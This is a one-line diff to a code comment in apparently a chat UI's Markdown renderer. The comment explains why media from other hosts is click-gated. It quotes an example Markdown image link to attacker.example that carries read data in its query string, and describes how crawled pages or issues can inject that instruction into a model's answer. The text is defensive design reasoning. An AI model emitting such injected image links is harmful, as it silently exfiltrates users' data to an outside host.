@@ -4,7 +4,7 @@
 // Markdown written by a model is the one place on the page whose content somebody else can steer: a
 // crawled page, a Jira issue or a web result can tell the model to end its answer with
 // `![x](https://attacker.example/p.png?d=<what it has read>)`, and an <img> sends that request the
-// moment the line streams in, with no click. So an answer, a sub-agent's report, a workflow step
+// moment the line streams in, with no click. So an answer, a deployed agent's report, a workflow step
 // and a key-account report draw media inline ONLY from this deployment's own conversation files -
 // the media the web tools saved, the files the agent wrote, the user's attachments - and anything
 // on another host waits for a click that names the host first (`RemoteMedia`). The system prompt
